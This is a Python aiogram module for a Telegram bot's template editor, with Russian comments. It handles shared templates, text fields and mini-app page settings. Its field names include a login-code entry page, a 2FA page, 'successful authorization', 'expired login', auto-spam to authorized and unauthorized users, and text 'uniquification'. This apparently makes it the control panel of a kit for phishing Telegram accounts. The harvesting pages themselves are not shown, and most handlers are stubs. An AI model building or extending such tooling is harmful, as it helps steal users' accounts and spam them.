"""
========================================================================
 МОДУЛЬ: «📋 Изменить шаблон» → меню шаблонов → редактор шаблона
------------------------------------------------------------------------
 Шаблоны общие для владельца: созданный в одном боте доступен всем его
 ботам (таблица templates, owner_id). Бот ссылается на выбранный шаблон
 через bots.template_id.

 Меню шаблонов:
   📋 Меню шаблонов:
   [ Шаблон 1 ]  [ Шаблон 2 ] ...    ← список общих шаблонов (✅ — текущий)
   [⚙️ Создать шаблон] [➕ Стандартный шаблон]
   [💎 Шаблоны мини-апп]
   [📥 Добавить по коду] [⬅️ Назад]

 Редактор шаблона — поля из макета (тексты, кнопки, страницы,
 уникализация…). Поля пока заглушки, наполняем по очереди; копия и
 удаление уже работают.
========================================================================
"""

from html import escape

from aiogram import F, Router
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

from database import (
    copy_template,
    create_template,
    delete_template,
    get_bot,
    get_owner_templates,
    get_template,
    set_bot_template,
    update_template_content,
)
from handlers.cards import owns

router = Router()


class TemplateEdit(StatesGroup):
    waiting_for_text = State()


def _ensure_templates(owner_id: int) -> list[dict]:
    """Гарантируем, что у владельца есть хотя бы один шаблон."""
    templates = get_owner_templates(owner_id)
    if not templates:
        create_template(owner_id, "Стандартный шаблон", "standard")
        templates = get_owner_templates(owner_id)
    return templates


# ----------------------------------------------------------- меню шаблонов
def _menu_kb(bot: dict, templates: list[dict]) -> InlineKeyboardMarkup:
    bid = bot["id"]
    current = bot.get("template_id")
    b = InlineKeyboardBuilder()
    for t in templates:
        mark = "✅ " if t["id"] == current else ""
        b.row(
            InlineKeyboardButton(
                text=f"{mark}{t['name']}",
                callback_data=f"std_open:{bid}:{t['id']}",
            )
        )
    b.row(
        InlineKeyboardButton(
            text="⚙️ Создать шаблон", callback_data=f"tpl_soon:{bid}:create"
        ),
        InlineKeyboardButton(
            text="➕ Стандартный шаблон", callback_data=f"tpl_new:{bid}"
        ),
    )
    b.row(
        InlineKeyboardButton(
            text="💎 Шаблоны мини-апп", callback_data=f"tpl_soon:{bid}:miniapp"
        )
    )
    b.row(
        InlineKeyboardButton(
            text="📥 Добавить по коду", callback_data=f"tpl_soon:{bid}:code"
        ),
        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"bot:{bid}"),
    )
    return b.as_markup()


async def _show_menu(callback: CallbackQuery, bot: dict) -> None:
    templates = _ensure_templates(bot["owner_id"])
    await callback.message.edit_text(
        "📋 <b>Меню шаблонов:</b>", reply_markup=_menu_kb(bot, templates)
    )


# ------------------------------------------- редактор шаблона (стандартный)
_STD_ROWS: list[tuple[str, str]] = [
    ("Ответ на /start", "start_msg"),
    ("Кнопка запуска мини-апп", "start_btn"),
    ("Второе сообщение после /start", "second_msg"),
    ("Просроченный вход", "expired_msg"),
    ("Кнопка просрочки", "expired_btn"),
    ("Успешная авторизация", "auth_ok"),
    ("Автоспам авторизованные", "spam_auth"),
    ("Автоспам неавторизованные", "spam_unauth"),
    ("Пост админ канала", "admin_post"),
    ("Показ успешной авторизации", "show_auth"),
    ("📋 Показ кода", "show_code"),
]

# Поля редактора, которые редактируются как обычный текст сообщения.
_TEXT_FIELDS: dict[str, str] = {
    "start_msg": "Ответ на /start",
    "second_msg": "Второе сообщение после /start",
    "expired_msg": "Просроченный вход",
    "auth_ok": "Успешная авторизация",
    "admin_post": "Пост админ канала",
    "spam_auth": "Автоспам авторизованные",
    "spam_unauth": "Автоспам неавторизованные",
}


def _std_text(template: dict) -> str:
    return f"💎 <b>Шаблон мини-апп «{template['name']}»:</b>"


def _std_kb(bid: int, tid: int) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    for label, act in _STD_ROWS:
        b.row(
            InlineKeyboardButton(
                text=label, callback_data=f"std_act:{bid}:{tid}:{act}"
            )
        )
    b.row(
        InlineKeyboardButton(
            text="📱 Страницы мини-апп", callback_data=f"tpl_pages:{bid}:{tid}"
        )
    )
    b.row(
        InlineKeyboardButton(
            text="⚡ Уникализация текста", callback_data=f"std_act:{bid}:{tid}:uniq"
        ),
        InlineKeyboardButton(
            text="📋 Создать копию", callback_data=f"tpl_copy:{bid}:{tid}"
        ),
    )
    b.row(
        InlineKeyboardButton(
            text="⚙️ Код шаблона", callback_data=f"std_act:{bid}:{tid}:tcode"
        ),
        InlineKeyboardButton(
            text="🏷 Название", callback_data=f"std_act:{bid}:{tid}:name"
        ),
    )
    b.row(
        InlineKeyboardButton(
            text="🎨 Оформление бота", callback_data=f"std_act:{bid}:{tid}:design"
        )
    )
    b.row(
        InlineKeyboardButton(
            text="🗑 Удалить шаблон", callback_data=f"tpl_del:{bid}:{tid}"
        )
    )
    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"template:{bid}"))
    return b.as_markup()


async def _show_editor(callback: CallbackQuery, bid: int, template: dict) -> None:
    await callback.message.edit_text(
        _std_text(template), reply_markup=_std_kb(bid, template["id"])
    )


# ---------------------------------------------- страницы мини-апп шаблона
_PAGE_ROWS: list[tuple[str, str]] = [
    ("Главная страница", "main"),
    ("Страница ввода кода", "code"),
    ("Страница с 2FA", "twofa"),
    ("Страница успешной авторизации", "success"),
    ("🖼 Фон", "bg"),
    ("💨 Блюр фона", "blur"),
    ("🎨 Цвет интерфейса", "color"),
]


def _pages_kb(bid: int, tid: int) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    for label, act in _PAGE_ROWS:
        b.row(
            InlineKeyboardButton(
                text=label, callback_data=f"pg_act:{bid}:{tid}:{act}"
            )
        )
    b.row(
        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"std_open:{bid}:{tid}")
    )
    return b.as_markup()


# ----------------------------------------------------------------- хендлеры
@router.callback_query(F.data.startswith("template:"))
async def open_menu(callback: CallbackQuery) -> None:
    bot = get_bot(int(callback.data.split(":")[1]))
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    await _show_menu(callback, bot)
    await callback.answer()


@router.callback_query(F.data.startswith("std_open:"))
async def open_template(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    set_bot_template(bid, tid)  # выбираем шаблон активным для бота
    await _show_editor(callback, bid, template)
    await callback.answer()


@router.callback_query(F.data.startswith("tpl_new:"))
async def new_template(callback: CallbackQuery) -> None:
    bid = int(callback.data.split(":")[1])
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    existing = get_owner_templates(callback.from_user.id)
    name = f"Стандартный шаблон {len(existing) + 1}"
    tid = create_template(callback.from_user.id, name, "standard")
    set_bot_template(bid, tid)
    await _show_editor(callback, bid, get_template(tid))
    await callback.answer("Шаблон создан ✅")


@router.callback_query(F.data.startswith("tpl_copy:"))
async def copy_tpl(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    copy_template(tid)
    await _show_menu(callback, bot)
    await callback.answer("Копия создана ✅")


@router.callback_query(F.data.startswith("tpl_del:"))
async def del_tpl(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    delete_template(tid)
    await _show_menu(callback, bot)
    await callback.answer("Шаблон удалён 🗑")


@router.callback_query(F.data.startswith("tpl_pages:"))
async def open_pages(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    await callback.message.edit_text(
        f"💎 <b>Страницы мини-апп шаблона «{template['name']}»:</b>",
        reply_markup=_pages_kb(bid, tid),
    )
    await callback.answer()


@router.callback_query(F.data.startswith("pg_act:"))
async def page_action(callback: CallbackQuery) -> None:
    await callback.answer("🚧 В разработке", show_alert=True)


# ----------------------------------------------- редактор текстового поля
def _field_kb(bid: int, tid: int, field: str, has_value: bool) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(
            text="✏️ Изменить", callback_data=f"fld_edit:{bid}:{tid}:{field}"
        )
    )
    if has_value:
        b.row(
            InlineKeyboardButton(
                text="🗑 Очистить", callback_data=f"fld_clr:{bid}:{tid}:{field}"
            )
        )
    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"std_open:{bid}:{tid}"))
    return b.as_markup()


def _field_text(field: str, template: dict) -> str:
    label = _TEXT_FIELDS[field]
    value = (template["content"].get(field) or "").strip()
    if value:
        body = f"Текущий текст:\n\n<code>{escape(value)}</code>"
    else:
        body = "Текст пока не задан."
    return f"✏️ <b>{label}</b>\n\n{body}"


async def _show_field(callback: CallbackQuery, bid: int, template: dict, field: str) -> None:
    has_value = bool((template["content"].get(field) or "").strip())
    await callback.message.edit_text(
        _field_text(field, template), reply_markup=_field_kb(bid, template["id"], field, has_value)
    )


def _resolve(callback: CallbackQuery) -> tuple[int, int, str, dict, dict] | None:
    """Разбор callback вида prefix:bid:tid:field с проверкой владения."""
    parts = callback.data.split(":")
    bid, tid, field = int(parts[1]), int(parts[2]), parts[3]
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        return None
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        return None
    return bid, tid, field, bot, template


@router.callback_query(F.data.startswith("std_act:"))
async def std_action(callback: CallbackQuery) -> None:
    parts = callback.data.split(":")
    field = parts[3]
    if field in _TEXT_FIELDS:
        res = _resolve(callback)
        if res is None:
            await callback.answer("Не найдено.", show_alert=True)
            return
        bid, tid, field, bot, template = res
        await _show_field(callback, bid, template, field)
        await callback.answer()
        return
    await callback.answer("🚧 В разработке", show_alert=True)


@router.callback_query(F.data.startswith("fld_edit:"))
async def field_edit(callback: CallbackQuery, state: FSMContext) -> None:
    res = _resolve(callback)
    if res is None:
        await callback.answer("Не найдено.", show_alert=True)
        return
    bid, tid, field, bot, template = res
    await state.set_state(TemplateEdit.waiting_for_text)
    await state.update_data(bid=bid, tid=tid, field=field)
    await callback.message.edit_text(
        f"✏️ Пришлите новый текст для «{_TEXT_FIELDS[field]}».\n\n"
        "Можно с HTML-разметкой (<b>, <i>, <a> …).",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Отмена", callback_data=f"std_act:{bid}:{tid}:{field}")]
            ]
        ),
    )
    await callback.answer()


@router.callback_query(F.data.startswith("fld_clr:"))
async def field_clear(callback: CallbackQuery) -> None:
    res = _resolve(callback)
    if res is None:
        await callback.answer("Не найдено.", show_alert=True)
        return
    bid, tid, field, bot, template = res
    update_template_content(tid, field, "")
    template = get_template(tid)
    await _show_field(callback, bid, template, field)
    await callback.answer("Очищено 🗑")


@router.message(TemplateEdit.waiting_for_text, F.text)
async def field_save(message: Message, state: FSMContext) -> None:
    data = await state.get_data()
    await state.clear()
    tid, field = data.get("tid"), data.get("field")
    bid = data.get("bid")
    if tid is None or field is None:
        return
    # сохраняем «как есть» (с HTML-разметкой, если прислали)
    text = message.html_text or message.text
    update_template_content(tid, field, text)
    template = get_template(tid)
    if template is None:
        return
    has_value = bool((template["content"].get(field) or "").strip())
    await message.answer(
        _field_text(field, template),
        reply_markup=_field_kb(bid, tid, field, has_value),
    )


@router.callback_query(F.data.startswith("tpl_soon:"))
async def not_ready(callback: CallbackQuery) -> None:
    await callback.answer("🚧 В разработке", show_alert=True)
